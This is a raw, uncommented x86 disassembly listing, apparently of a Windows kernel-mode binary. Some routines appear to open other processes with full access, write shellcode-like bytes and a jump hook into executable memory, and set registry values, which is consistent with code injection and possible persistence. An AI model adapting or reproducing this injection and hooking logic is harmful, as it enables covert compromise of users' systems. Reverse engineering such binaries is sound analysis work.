   16e6c:	mov    esi,DWORD PTR [ebp+0xc]
   16e6f:	mov    eax,ds:0x7fa5c
   16e74:	cmp    esi,DWORD PTR [eax+0x4]
   16e77:	je     0x16e7e
   16e79:	mov    esi,DWORD PTR [esi+0x14]
   16e7c:	jmp    0x16e81
   16e7e:	mov    esi,DWORD PTR [ebp+0x8]
   16e81:	call   0x1a21e
   16e86:	push   DWORD PTR [ebp-0x8]
   16e89:	call   0x10a86
   16e8e:	pop    ecx
   16e8f:	mov    eax,esi
   16e91:	pop    esi
   16e92:	leave  
   16e93:	ret    0xc
   16e96:	int3   
   16e97:	int3   
   16e98:	int3   
   16e99:	int3   
   16e9a:	int3   
   16e9b:	int3   
   16e9c:	mov    edi,edi
   16e9e:	push   esi
   16e9f:	mov    esi,ecx
   16ea1:	mov    BYTE PTR [esi+0x8],0x0
   16ea5:	call   0x140a6
   16eaa:	mov    eax,esi
   16eac:	pop    esi
   16ead:	ret    0x8
   16eb0:	int3   
   16eb1:	int3   
   16eb2:	int3   
   16eb3:	int3   
   16eb4:	int3   
   16eb5:	int3   
   16eb6:	mov    edi,edi
   16eb8:	push   ebp
   16eb9:	mov    ebp,esp
   16ebb:	sub    esp,0xb0
   16ec1:	push   esi
   16ec2:	mov    esi,ecx
   16ec4:	lea    ecx,[ebp-0x58]
   16ec7:	call   0x136ea
   16ecc:	push   eax
   16ecd:	push   DWORD PTR [ebp+0x8]
   16ed0:	lea    ecx,[ebp-0xb0]
   16ed6:	call   0x138c6
   16edb:	push   eax
   16edc:	lea    eax,[ebp-0x8]
   16edf:	push   eax
   16ee0:	mov    ecx,esi
   16ee2:	call   0x16b10
   16ee7:	mov    esi,DWORD PTR [eax]
   16ee9:	lea    ecx,[ebp-0xb0]
   16eef:	call   0x12b10
   16ef4:	lea    ecx,[ebp-0x58]
   16ef7:	call   0x11ef4
   16efc:	lea    eax,[esi+0x18]
   16eff:	pop    esi
   16f00:	leave  
   16f01:	ret    0x4
   16f04:	int3   
   16f05:	int3   
   16f06:	int3   
   16f07:	int3   
   16f08:	int3   
   16f09:	int3   
   16f0a:	mov    edi,edi
   16f0c:	push   ebp
   16f0d:	mov    ebp,esp
   16f0f:	sub    esp,0x20
   16f12:	push   esi
   16f13:	push   0xffffffff
   16f15:	mov    esi,ecx
   16f17:	push   0x1df10
   16f1c:	lea    ecx,[ebp-0x8]
   16f1f:	call   0x110b8
   16f24:	lea    eax,[ebp-0x8]
   16f27:	push   eax
   16f28:	push   DWORD PTR [ebp+0x8]
   16f2b:	lea    ecx,[ebp-0x20]
   16f2e:	call   0x1361a
   16f33:	push   eax
   16f34:	lea    eax,[ebp-0x10]
   16f37:	push   eax
   16f38:	mov    ecx,esi
   16f3a:	call   0x16b58
   16f3f:	mov    esi,DWORD PTR [eax]
   16f41:	lea    ecx,[ebp-0x20]
   16f44:	call   0x1109a
   16f49:	push   DWORD PTR [ebp-0x8]
   16f4c:	call   0x10a86
   16f51:	pop    ecx
   16f52:	lea    eax,[esi+0x14]
   16f55:	pop    esi
   16f56:	leave  
   16f57:	ret    0x4
   16f5a:	int3   
   16f5b:	int3   
   16f5c:	int3   
   16f5d:	int3   
   16f5e:	int3   
   16f5f:	int3   
   16f60:	mov    edi,edi
   16f62:	push   esi
   16f63:	mov    esi,ecx
   16f65:	mov    BYTE PTR [esi+0x8],0x0
   16f69:	call   0x141ce
   16f6e:	mov    eax,esi
   16f70:	pop    esi
   16f71:	ret    0x8
   16f74:	int3   
   16f75:	int3   
   16f76:	int3   
   16f77:	int3   
   16f78:	int3   
   16f79:	int3   
   16f7a:	mov    edi,edi
   16f7c:	push   ebp
   16f7d:	mov    ebp,esp
   16f7f:	sub    esp,0x14
   16f82:	and    DWORD PTR [ebp-0x4],0x0
   16f86:	push   esi
   16f87:	lea    eax,[ebp-0x4]
   16f8a:	push   eax
   16f8b:	push   DWORD PTR [ebp+0x8]
   16f8e:	mov    esi,ecx
   16f90:	lea    ecx,[ebp-0xc]
   16f93:	call   0x12c4e
   16f98:	push   eax
   16f99:	lea    eax,[ebp-0x14]
   16f9c:	push   eax
   16f9d:	mov    ecx,esi
   16f9f:	call   0x16b82
   16fa4:	mov    ecx,DWORD PTR [ebp-0x8]
   16fa7:	mov    esi,DWORD PTR [eax]
   16fa9:	test   ecx,ecx
   16fab:	je     0x16fb2
   16fad:	call   0x10aa4
   16fb2:	lea    eax,[esi+0x10]
   16fb5:	pop    esi
   16fb6:	leave  
   16fb7:	ret    0x4
   16fba:	int3   
   16fbb:	int3   
   16fbc:	int3   
   16fbd:	int3   
   16fbe:	int3   
   16fbf:	int3   
   16fc0:	mov    edi,edi
   16fc2:	push   ebp
   16fc3:	mov    ebp,esp
   16fc5:	sub    esp,0x20
   16fc8:	push   esi
   16fc9:	mov    esi,ecx
   16fcb:	mov    eax,DWORD PTR [esi+0x24]
   16fce:	mov    ecx,DWORD PTR [esi+0x28]
   16fd1:	add    ecx,eax
   16fd3:	cmp    DWORD PTR [esi+0x10],ecx
   16fd6:	jbe    0x17069
   16fdc:	mov    ecx,DWORD PTR [esi+0x18]
   16fdf:	mov    ecx,DWORD PTR [ecx]
   16fe1:	push   edi
   16fe2:	mov    DWORD PTR [ebp-0x4],ecx
   16fe5:	test   eax,eax
   16fe7:	je     0x16ff6
   16fe9:	mov    edi,eax
   16feb:	lea    ecx,[ebp-0x4]
   16fee:	call   0x12f48
   16ff3:	dec    edi
   16ff4:	jne    0x16feb
   16ff6:	mov    eax,DWORD PTR [ebp-0x4]
   16ff9:	mov    edi,DWORD PTR [eax+0xc]
   16ffc:	lea    ecx,[ebp-0x20]
   16fff:	mov    BYTE PTR [ebp-0x18],0x0
   17003:	call   0x14502
   17008:	mov    eax,DWORD PTR [esi+0x8]
   1700b:	mov    ecx,DWORD PTR [eax]
   1700d:	mov    DWORD PTR [ebp-0x4],ecx
   17010:	cmp    ecx,eax
   17012:	je     0x17053
   17014:	lea    edx,[ecx+0x68]
   17017:	mov    eax,DWORD PTR [edx]
   17019:	cmp    eax,edi
   1701b:	jae    0x17032
   1701d:	push   ecx
   1701e:	lea    eax,[ebp-0x8]
   17021:	push   eax
   17022:	lea    ecx,[esi+0x4]
   17025:	call   0x14f5a
   1702a:	mov    ecx,DWORD PTR [ebp-0x8]
   1702d:	mov    DWORD PTR [ebp-0x4],ecx
   17030:	jmp    0x1704e
   17032:	sub    eax,edi
   17034:	mov    DWORD PTR [edx],eax
   17036:	push   edx
   17037:	lea    eax,[ebp-0x10]
   1703a:	push   eax
   1703b:	lea    ecx,[ebp-0x20]
   1703e:	call   0x160e6
   17043:	lea    ecx,[ebp-0x4]
   17046:	call   0x12ed2
   1704b:	mov    ecx,DWORD PTR [ebp-0x4]
   1704e:	cmp    ecx,DWORD PTR [esi+0x8]
   17051:	jne    0x17014
   17053:	lea    eax,[ebp-0x20]
   17056:	push   eax
   17057:	add    esi,0x14
   1705a:	push   esi
   1705b:	call   0x16686
   17060:	lea    ecx,[ebp-0x20]
   17063:	call   0x16110
   17068:	pop    edi
   17069:	pop    esi
   1706a:	leave  
   1706b:	ret    
   1706c:	int3   
   1706d:	int3   
   1706e:	int3   
   1706f:	int3   
   17070:	int3   
   17071:	int3   
   17072:	mov    edi,edi
   17074:	push   ebp
   17075:	mov    ebp,esp
   17077:	sub    esp,0x20
   1707a:	push   esi
   1707b:	push   0xffffffff
   1707d:	mov    esi,ecx
   1707f:	push   0x1de6e
   17084:	lea    ecx,[ebp-0x8]
   17087:	call   0x1115c
   1708c:	lea    eax,[ebp-0x8]
   1708f:	push   eax
   17090:	push   DWORD PTR [ebp+0x8]
   17093:	lea    ecx,[ebp-0x20]
   17096:	call   0x12d1c
   1709b:	push   eax
   1709c:	lea    eax,[ebp-0x10]
   1709f:	push   eax
   170a0:	mov    ecx,esi
   170a2:	call   0x16c14
   170a7:	mov    esi,DWORD PTR [eax]
   170a9:	lea    ecx,[ebp-0x20]
   170ac:	call   0x1109a
   170b1:	push   DWORD PTR [ebp-0x8]
   170b4:	call   0x10a86
   170b9:	pop    ecx
   170ba:	lea    eax,[esi+0x14]
   170bd:	pop    esi
   170be:	leave  
   170bf:	ret    0x4
   170c2:	int3   
   170c3:	int3   
   170c4:	int3   
   170c5:	int3   
   170c6:	int3   
   170c7:	int3   
   170c8:	mov    edi,edi
   170ca:	push   ebp
   170cb:	mov    ebp,esp
   170cd:	sub    esp,0x838
   170d3:	mov    eax,ds:0x7e528
   170d8:	xor    eax,ebp
   170da:	mov    DWORD PTR [ebp-0x4],eax
   170dd:	mov    eax,DWORD PTR [ebp+0x8]
   170e0:	push   ebx
   170e1:	push   esi
   170e2:	push   edi
   170e3:	mov    DWORD PTR [ebp-0x808],eax
   170e9:	xor    eax,eax
   170eb:	push   0x7fe
   170f0:	mov    WORD PTR [ebp-0x804],ax
   170f7:	xor    ebx,ebx
   170f9:	lea    eax,[ebp-0x802]
   170ff:	push   ebx
   17100:	push   eax
   17101:	call   0x1daba
   17106:	mov    eax,0x7e6c0
   1710b:	add    esp,0xc
   1710e:	mov    edx,eax
   17110:	mov    cx,WORD PTR [eax]
   17113:	inc    eax
   17114:	inc    eax
   17115:	cmp    cx,bx
   17118:	jne    0x17110
   1711a:	sub    eax,edx
   1711c:	lea    edi,[ebp-0x804]
   17122:	dec    edi
   17123:	dec    edi
   17124:	mov    cx,WORD PTR [edi+0x2]
   17128:	inc    edi
   17129:	inc    edi
   1712a:	cmp    cx,bx
   1712d:	jne    0x17124
   1712f:	mov    ecx,eax
   17131:	shr    ecx,0x2
   17134:	mov    esi,edx
   17136:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   17138:	mov    ecx,eax
   1713a:	mov    eax,DWORD PTR [ebp-0x808]
   17140:	and    ecx,0x3
   17143:	add    eax,0x400
   17148:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   1714a:	mov    edx,eax
   1714c:	mov    cx,WORD PTR [eax]
   1714f:	inc    eax
   17150:	inc    eax
   17151:	cmp    cx,bx
   17154:	jne    0x1714c
   17156:	sub    eax,edx
   17158:	lea    edi,[ebp-0x804]
   1715e:	dec    edi
   1715f:	dec    edi
   17160:	mov    cx,WORD PTR [edi+0x2]
   17164:	inc    edi
   17165:	inc    edi
   17166:	cmp    cx,bx
   17169:	jne    0x17160
   1716b:	mov    ecx,eax
   1716d:	shr    ecx,0x2
   17170:	mov    esi,edx
   17172:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   17174:	mov    ecx,eax
   17176:	and    ecx,0x3
   17179:	lea    eax,[ebp-0x804]
   1717f:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   17181:	mov    DWORD PTR [ebp-0x818],eax
   17187:	lea    ecx,[eax+0x2]
   1718a:	mov    dx,WORD PTR [eax]
   1718d:	inc    eax
   1718e:	inc    eax
   1718f:	cmp    dx,bx
   17192:	jne    0x1718a
   17194:	sub    eax,ecx
   17196:	sar    eax,1
   17198:	add    eax,eax
   1719a:	mov    WORD PTR [ebp-0x81a],ax
   171a1:	mov    WORD PTR [ebp-0x81c],ax
   171a8:	lea    eax,[ebp-0x81c]
   171ae:	mov    DWORD PTR [ebp-0x82c],eax
   171b4:	lea    eax,[ebp-0x838]
   171ba:	push   eax
   171bb:	xor    edi,edi
   171bd:	inc    edi
   171be:	push   edi
   171bf:	push   ebx
   171c0:	push   ebx
   171c1:	lea    eax,[ebp-0x834]
   171c7:	push   eax
   171c8:	push   0xf003f
   171cd:	lea    eax,[ebp-0x80c]
   171d3:	push   eax
   171d4:	mov    DWORD PTR [ebp-0x834],0x18
   171de:	mov    DWORD PTR [ebp-0x830],ebx
   171e4:	mov    DWORD PTR [ebp-0x828],0x40
   171ee:	mov    DWORD PTR [ebp-0x824],ebx
   171f4:	mov    DWORD PTR [ebp-0x820],ebx
   171fa:	call   0x119fe
   171ff:	call   eax
   17201:	test   eax,eax
   17203:	jl     0x17393
   17209:	push   0x1e59e
   1720e:	push   0x9
   17210:	push   0x1e58a
   17215:	call   0x16cb0
   1721a:	mov    DWORD PTR [ebp-0x810],eax
   17220:	lea    edx,[eax+0x2]
   17223:	mov    cx,WORD PTR [eax]
   17226:	inc    eax
   17227:	inc    eax
   17228:	cmp    cx,bx
   1722b:	jne    0x17223
   1722d:	sub    eax,edx
   1722f:	sar    eax,1
   17231:	add    eax,eax
   17233:	mov    WORD PTR [ebp-0x812],ax
   1723a:	mov    WORD PTR [ebp-0x814],ax
   17241:	mov    eax,DWORD PTR [ebp-0x808]
   17247:	lea    ecx,[eax+0x2]
   1724a:	mov    dx,WORD PTR [eax]
   1724d:	inc    eax
   1724e:	inc    eax
   1724f:	cmp    dx,bx
   17252:	jne    0x1724a
   17254:	sub    eax,ecx
   17256:	sar    eax,1
   17258:	inc    eax
   17259:	movzx  eax,ax
   1725c:	add    eax,eax
   1725e:	push   eax
   1725f:	push   DWORD PTR [ebp-0x808]
   17265:	lea    eax,[ebp-0x814]
   1726b:	push   edi
   1726c:	push   ebx
   1726d:	push   eax
   1726e:	push   DWORD PTR [ebp-0x80c]
   17274:	call   0x11806
   17279:	call   eax
   1727b:	test   eax,eax
   1727d:	jl     0x17393
   17283:	push   0x1e550
   17288:	push   0x5
   1728a:	push   0x1e544
   1728f:	mov    DWORD PTR [ebp-0x808],0x3
   17299:	call   0x16cb0
   1729e:	mov    DWORD PTR [ebp-0x810],eax
   172a4:	lea    edx,[eax+0x2]
   172a7:	mov    cx,WORD PTR [eax]
   172aa:	inc    eax
   172ab:	inc    eax
   172ac:	cmp    cx,bx
   172af:	jne    0x172a7
   172b1:	sub    eax,edx
   172b3:	push   0x4
   172b5:	sar    eax,1
   172b7:	pop    esi
   172b8:	add    eax,eax
   172ba:	push   esi
   172bb:	mov    WORD PTR [ebp-0x812],ax
   172c2:	mov    WORD PTR [ebp-0x814],ax
   172c9:	lea    eax,[ebp-0x808]
   172cf:	push   eax
   172d0:	push   esi
   172d1:	push   ebx
   172d2:	lea    eax,[ebp-0x814]
   172d8:	push   eax
   172d9:	push   DWORD PTR [ebp-0x80c]
   172df:	call   0x11806
   172e4:	call   eax
   172e6:	test   eax,eax
   172e8:	jl     0x17393
   172ee:	push   0x1e508
   172f3:	push   esi
   172f4:	push   0x1e4fe
   172f9:	mov    DWORD PTR [ebp-0x808],edi
   172ff:	call   0x16cb0
   17304:	mov    DWORD PTR [ebp-0x810],eax
   1730a:	lea    ecx,[eax+0x2]
   1730d:	mov    dx,WORD PTR [eax]
   17310:	inc    eax
   17311:	inc    eax
   17312:	cmp    dx,bx
   17315:	jne    0x1730d
   17317:	sub    eax,ecx
   17319:	sar    eax,1
   1731b:	add    eax,eax
   1731d:	push   esi
   1731e:	mov    WORD PTR [ebp-0x812],ax
   17325:	mov    WORD PTR [ebp-0x814],ax
   1732c:	lea    eax,[ebp-0x808]
   17332:	push   eax
   17333:	push   esi
   17334:	push   ebx
   17335:	lea    eax,[ebp-0x814]
   1733b:	push   eax
   1733c:	push   DWORD PTR [ebp-0x80c]
   17342:	call   0x11806
   17347:	call   eax
   17349:	test   eax,eax
   1734b:	jl     0x17393
   1734d:	lea    eax,[ebp-0x81c]
   17353:	push   eax
   17354:	call   0x119d4
   17359:	call   eax
   1735b:	test   eax,eax
   1735d:	jl     0x17393
   1735f:	lea    eax,[ebp-0x804]
   17365:	push   eax
   17366:	push   DWORD PTR [ebp-0x80c]
   1736c:	call   0x12190
   17371:	test   al,al
   17373:	je     0x17386
   17375:	push   DWORD PTR [ebp-0x80c]
   1737b:	call   0x117dc
   17380:	call   eax
   17382:	test   eax,eax
   17384:	jl     0x17393
   17386:	push   DWORD PTR [ebp-0x80c]
   1738c:	call   0x11956
   17391:	call   eax
   17393:	mov    ecx,DWORD PTR [ebp-0x4]
   17396:	pop    edi
   17397:	pop    esi
   17398:	xor    ecx,ebp
   1739a:	pop    ebx
   1739b:	call   0x1da55
   173a0:	leave  
   173a1:	ret    0x4
   173a4:	int3   
   173a5:	int3   
   173a6:	int3   
   173a7:	int3   
   173a8:	int3   
   173a9:	int3   
   173aa:	mov    edi,edi
   173ac:	push   ebp
   173ad:	mov    ebp,esp
   173af:	sub    esp,0x44
   173b2:	mov    eax,DWORD PTR [ebp+0xc]
   173b5:	mov    eax,DWORD PTR [eax]
   173b7:	push   esi
   173b8:	mov    DWORD PTR [ebp-0x2c],eax
   173bb:	lea    eax,[ebp-0x2c]
   173be:	push   eax
   173bf:	lea    eax,[ebp-0x44]
   173c2:	push   eax
   173c3:	xor    esi,esi
   173c5:	push   0x1f0fff
   173ca:	lea    eax,[ebp-0x10]
   173cd:	push   eax
   173ce:	mov    DWORD PTR [ebp-0x44],0x18
   173d5:	mov    DWORD PTR [ebp-0x40],esi
   173d8:	mov    DWORD PTR [ebp-0x38],0x200
   173df:	mov    DWORD PTR [ebp-0x3c],esi
   173e2:	mov    DWORD PTR [ebp-0x34],esi
   173e5:	mov    DWORD PTR [ebp-0x30],esi
   173e8:	mov    DWORD PTR [ebp-0x28],esi
   173eb:	mov    DWORD PTR [ebp-0x10],esi
   173ee:	call   0x1168c
   173f3:	call   eax
   173f5:	test   eax,eax
   173f7:	jl     0x17668
   173fd:	push   ebx
   173fe:	push   edi
   173ff:	push   0x40
   17401:	mov    edi,0x1000
   17406:	push   edi
   17407:	lea    eax,[ebp-0x14]
   1740a:	push   eax
   1740b:	push   esi
   1740c:	lea    eax,[ebp-0x8]
   1740f:	push   eax
   17410:	push   DWORD PTR [ebp-0x10]
   17413:	mov    DWORD PTR [ebp-0x8],esi
   17416:	mov    esi,DWORD PTR ds:0x1f040
   1741c:	mov    ebx,0x400
   17421:	mov    DWORD PTR [ebp-0x14],ebx
   17424:	call   esi
   17426:	test   eax,eax
   17428:	jl     0x17433
   1742a:	mov    eax,DWORD PTR [ebp-0x8]
   1742d:	mov    ecx,DWORD PTR [ebp+0xc]
   17430:	mov    DWORD PTR [ecx+0x8],eax
   17433:	and    DWORD PTR [ebp-0x18],0x0
   17437:	push   0x4
   17439:	push   edi
   1743a:	lea    eax,[ebp-0x14]
   1743d:	push   eax
   1743e:	push   0x0
   17440:	lea    eax,[ebp-0x18]
   17443:	push   eax
   17444:	push   DWORD PTR [ebp-0x10]
   17447:	mov    DWORD PTR [ebp-0x14],ebx
   1744a:	call   esi
   1744c:	test   eax,eax
   1744e:	jl     0x17459
   17450:	mov    eax,DWORD PTR [ebp-0x18]
   17453:	mov    ecx,DWORD PTR [ebp+0xc]
   17456:	mov    DWORD PTR [ecx+0xc],eax
   17459:	lea    eax,[ebp-0x1c]
   1745c:	push   eax
   1745d:	push   DWORD PTR [ebp-0x2c]
   17460:	call   0x11cc8
   17465:	call   eax
   17467:	test   eax,eax
   17469:	jl     0x17666
   1746f:	push   DWORD PTR [ebp-0x1c]
   17472:	call   0x11a7c
   17477:	call   eax
   17479:	mov    ebx,DWORD PTR [ebp-0x8]
   1747c:	and    DWORD PTR [ebp-0x4],0x0
   17480:	test   ebx,ebx
   17482:	je     0x1764c
   17488:	mov    edi,DWORD PTR [ebp-0x18]
   1748b:	push   0x40
   1748d:	push   0x7e408
   17492:	push   edi
   17493:	mov    DWORD PTR [ebp-0xc],edi
   17496:	call   0x19882
   1749b:	push   0x1e5d4
   174a0:	push   0x4
   174a2:	push   0x1e5ca
   174a7:	call   0x16cb0
   174ac:	mov    esi,eax
   174ae:	mov    cx,WORD PTR [eax]
   174b1:	inc    eax
   174b2:	inc    eax
   174b3:	test   cx,cx
   174b6:	jne    0x174ae
   174b8:	sub    eax,esi
   174ba:	dec    edi
   174bb:	dec    edi
   174bc:	mov    cx,WORD PTR [edi+0x2]
   174c0:	inc    edi
   174c1:	inc    edi
   174c2:	test   cx,cx
   174c5:	jne    0x174bc
   174c7:	mov    ecx,eax
   174c9:	shr    ecx,0x2
   174cc:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   174ce:	mov    ecx,eax
   174d0:	push   0x60
   174d2:	and    ecx,0x3
   174d5:	push   ebx
   174d6:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   174d8:	mov    DWORD PTR [ebp-0x20],ebx
   174db:	call   0x19834
   174e0:	push   0x68
   174e2:	push   eax
   174e3:	call   0x19834
   174e8:	push   DWORD PTR [ebp-0xc]
   174eb:	push   eax
   174ec:	call   0x1984c
   174f1:	push   0xb8
   174f6:	push   eax
   174f7:	call   0x19834
   174fc:	push   DWORD PTR ds:0x7ef70
   17502:	push   eax
   17503:	call   0x1984c
   17508:	push   0xc00b
   1750d:	push   eax
   1750e:	call   0x19866
   17513:	push   0x74
   17515:	push   eax
   17516:	call   0x19834
   1751b:	push   0x2
   1751d:	push   eax
   1751e:	call   0x19834
   17523:	push   0xd0ff
   17528:	push   eax
   17529:	call   0x19866
   1752e:	push   0x61
   17530:	push   eax
   17531:	call   0x19834
   17536:	mov    ebx,DWORD PTR [ebp+0x8]
   17539:	mov    edi,eax
   1753b:	mov    esi,ebx
   1753d:	push   0x0
   1753f:	push   esi
   17540:	push   edi
   17541:	call   0x19fe8
   17546:	mov    ecx,eax
   17548:	sub    ecx,esi
   1754a:	add    DWORD PTR [ebp-0x4],ecx
   1754d:	add    edi,ecx
   1754f:	cmp    DWORD PTR [ebp-0x4],0x5
   17553:	mov    esi,eax
   17555:	jb     0x1753d
   17557:	mov    eax,DWORD PTR [ebp-0x4]
   1755a:	push   edi
   1755b:	add    eax,ebx
   1755d:	push   eax
   1755e:	call   0x198aa
   17563:	mov    eax,DWORD PTR [ebp-0x8]
   17566:	test   eax,eax
   17568:	je     0x1764c
   1756e:	add    eax,0x400
   17573:	lea    ecx,[eax-0x10]
   17576:	mov    DWORD PTR [ebp-0x24],ecx
   17579:	mov    ecx,DWORD PTR [ebp-0x4]
   1757c:	lea    esi,[eax-0xc]
   1757f:	push   esi
   17580:	lea    edi,[eax-0x4]
   17583:	lea    ebx,[eax-0x8]
   17586:	shr    ecx,0x2
   17589:	lea    ecx,[ecx*4+0x14]
   17590:	push   0x40
   17592:	sub    eax,ecx
   17594:	push   ebx
   17595:	mov    DWORD PTR [ebp-0xc],eax
   17598:	mov    eax,DWORD PTR [ebp+0x8]
   1759b:	mov    DWORD PTR [edi],eax
   1759d:	push   edi
   1759e:	mov    DWORD PTR [ebx],0x5
   175a4:	and    DWORD PTR [esi],0x0
   175a7:	push   0xffffffff
   175a9:	call   DWORD PTR ds:0x7eeec
   175af:	test   eax,eax
   175b1:	jl     0x17616
   175b3:	push   DWORD PTR [ebp-0x4]
   175b6:	push   0x90
   175bb:	push   DWORD PTR [ebp-0xc]
   175be:	call   0x1daba
   175c3:	mov    eax,DWORD PTR [ebp-0x20]
   175c6:	sub    eax,DWORD PTR [ebp+0x8]
   175c9:	add    esp,0xc
   175cc:	sub    eax,0x5
   175cf:	push   eax
   175d0:	mov    eax,DWORD PTR [ebp-0xc]
   175d3:	inc    eax
   175d4:	push   eax
   175d5:	call   0x1984c
   175da:	push   0xe9
   175df:	push   DWORD PTR [ebp-0xc]
   175e2:	call   0x19834
   175e7:	mov    eax,DWORD PTR [ebp-0x24]
   175ea:	and    DWORD PTR [eax],0x0
   175ed:	push   eax
   175ee:	push   DWORD PTR [ebp-0x4]
   175f1:	push   DWORD PTR [ebp-0xc]
   175f4:	push   DWORD PTR [ebp+0x8]
   175f7:	push   0xffffffff
   175f9:	call   DWORD PTR ds:0x7eee0
   175ff:	mov    eax,DWORD PTR [ebp+0xc]
   17602:	mov    BYTE PTR [eax+0x10],0x1
   17606:	lea    eax,[ebp-0x20]
   17609:	push   eax
   1760a:	push   DWORD PTR [esi]
   1760c:	push   ebx
   1760d:	push   edi
   1760e:	push   0xffffffff
   17610:	call   DWORD PTR ds:0x7eeec
   17616:	mov    esi,DWORD PTR [ebp-0x8]
   17619:	test   esi,esi
   1761b:	je     0x1764c
   1761d:	lea    eax,[esi+0x400]
   17623:	lea    ecx,[eax-0x4]
   17626:	lea    edx,[eax-0x8]
   17629:	add    eax,0xfffffff4
   1762c:	push   eax
   1762d:	push   0x20
   1762f:	push   edx
   17630:	mov    DWORD PTR [ecx],esi
   17632:	push   ecx
   17633:	mov    DWORD PTR [edx],0x400
   17639:	and    DWORD PTR [eax],0x0
   1763c:	push   0xffffffff
   1763e:	call   DWORD PTR ds:0x7eeec
   17644:	test   eax,eax
   17646:	jge    0x1764c
   17648:	and    DWORD PTR [ebp-0x8],0x0
   1764c:	call   0x11a52
   17651:	call   eax
   17653:	mov    ecx,DWORD PTR [ebp-0x1c]
   17656:	call   DWORD PTR ds:0x1f05c
   1765c:	push   DWORD PTR [ebp-0x10]
   1765f:	call   0x11956
   17664:	call   eax
   17666:	pop    edi
   17667:	pop    ebx
   17668:	pop    esi
   17669:	leave  
   1766a:	ret    0x8
   1766d:	int3   
   1766e:	int3   
   1766f:	int3   
   17670:	int3   
   17671:	int3   
   17672:	mov    edi,edi
   17674:	push   ebp
   17675:	mov    ebp,esp
   17677:	cmp    DWORD PTR ds:0x7ef70,0x0
   1767e:	push   esi
   1767f:	mov    esi,DWORD PTR [ebp+0x10]
   17682:	jne    0x1774d
   17688:	push   0x1e784
   1768d:	push   0xc
   1768f:	push   0x1e76a
   17694:	call   0x16cb0
   17699:	push   eax
   1769a:	push   DWORD PTR [ebp+0x8]
   1769d:	call   0x10e02
   176a2:	test   al,al
   176a4:	je     0x1774d
   176aa:	mov    eax,DWORD PTR [esi+0x4]
   176ad:	push   0x1e72c
   176b2:	push   0xc
   176b4:	push   0x1e71e
   176b9:	mov    ds:0x7ef68,eax
   176be:	call   0x16da6
   176c3:	push   eax
   176c4:	push   DWORD PTR [esi+0x4]
   176c7:	call   0x123f4
   176cc:	push   0x1e6ee
   176d1:	push   0xc
   176d3:	push   0x1e6e0
   176d8:	mov    ds:0x7ef70,eax
   176dd:	call   0x16da6
   176e2:	push   eax
   176e3:	push   DWORD PTR [esi+0x4]
   176e6:	call   0x123f4
   176eb:	push   0x1e6a8
   176f0:	push   0xc
   176f2:	push   0x1e69a
   176f7:	mov    ds:0x7ef74,eax
   176fc:	call   0x16da6
   17701:	push   eax
   17702:	push   DWORD PTR [esi+0x4]
   17705:	call   0x123f4
   1770a:	push   0x1e66c
   1770f:	push   0x5
   17711:	push   0x1e666
   17716:	mov    ds:0x7ef78,eax
   1771b:	call   0x16da6
   17720:	push   eax
   17721:	push   DWORD PTR [esi+0x4]
   17724:	call   0x123f4
   17729:	push   0x1e63c
   1772e:	push   0x4
   17730:	push   0x1e636
   17735:	mov    ds:0x7ef7c,eax
   1773a:	call   0x16da6
   1773f:	push   eax
   17740:	push   DWORD PTR [esi+0x4]
   17743:	call   0x123f4
   17748:	mov    ds:0x7ef80,eax
   1774d:	cmp    DWORD PTR ds:0x7ef6c,0x0
   17754:	jne    0x1777c
   17756:	push   0x1e60e
   1775b:	push   0x9
   1775d:	push   0x1e5fa
   17762:	call   0x16cb0
   17767:	push   eax
   17768:	push   DWORD PTR [ebp+0x8]
   1776b:	call   0x10e02
   17770:	test   al,al
   17772:	je     0x1777c
   17774:	mov    eax,DWORD PTR [esi+0x4]
   17777:	mov    ds:0x7ef6c,eax
   1777c:	pop    esi
   1777d:	pop    ebp
   1777e:	ret    0xc
   17781:	int3   
   17782:	int3   
   17783:	int3   
   17784:	int3   
   17785:	int3   
   17786:	mov    edi,edi
   17788:	push   ebp
   17789:	mov    ebp,esp
   1778b:	sub    esp,0x4c
   1778e:	push   ebx
   1778f:	push   esi
   17790:	push   edi
   17791:	push   DWORD PTR [ebp+0xc]
   17794:	push   DWORD PTR [ebp+0x8]
   17797:	call   DWORD PTR ds:0x7eef8
   1779d:	mov    DWORD PTR [ebp-0x8],eax
   177a0:	xor    eax,eax
   177a2:	xor    ebx,ebx
   177a4:	mov    DWORD PTR [ebp-0x30],ebx
   177a7:	lea    edi,[ebp-0x2c]
   177aa:	stos   DWORD PTR es:[edi],eax
   177ab:	stos   DWORD PTR es:[edi],eax
   177ac:	stos   DWORD PTR es:[edi],eax
   177ad:	stos   DWORD PTR es:[edi],eax
   177ae:	xor    eax,eax
   177b0:	mov    DWORD PTR [ebp-0x1c],ebx
   177b3:	lea    edi,[ebp-0x18]
   177b6:	stos   DWORD PTR es:[edi],eax
   177b7:	stos   DWORD PTR es:[edi],eax
   177b8:	stos   DWORD PTR es:[edi],eax
   177b9:	stos   DWORD PTR es:[edi],eax
   177ba:	lea    eax,[ebp-0x30]
   177bd:	push   eax
   177be:	push   ebx
   177bf:	call   0x10e90
   177c4:	mov    BYTE PTR [ebp+0xf],al
   177c7:	lea    eax,[ebp-0x1c]
   177ca:	push   eax
   177cb:	push   0x1
   177cd:	call   0x10e90
   177d2:	mov    BYTE PTR [ebp-0x1],al
   177d5:	cmp    BYTE PTR [ebp+0xf],bl
   177d8:	je     0x17839
   177da:	mov    esi,DWORD PTR [ebp-0x30]
   177dd:	cmp    esi,ebx
   177df:	je     0x17839
   177e1:	push   0x6
   177e3:	pop    ecx
   177e4:	push   ebx
   177e5:	xor    eax,eax
   177e7:	mov    DWORD PTR [ebp-0x4c],ebx
   177ea:	lea    edi,[ebp-0x48]
   177ed:	push   0x1c
   177ef:	rep stos DWORD PTR es:[edi],eax
   177f1:	lea    eax,[ebp-0x4c]
   177f4:	push   eax
   177f5:	push   ebx
   177f6:	push   DWORD PTR [ebp+0x8]
   177f9:	call   0x1192c
   177fe:	call   eax
   17800:	cmp    DWORD PTR [ebp-0x44],esi
   17803:	jne    0x17839
   17805:	push   ebx
   17806:	push   0x4
   17808:	lea    eax,[ebp+0xc]
   1780b:	push   eax
   1780c:	push   0x9
   1780e:	push   DWORD PTR [ebp+0x8]
   17811:	mov    DWORD PTR [ebp+0xc],ebx
   17814:	call   0x1192c
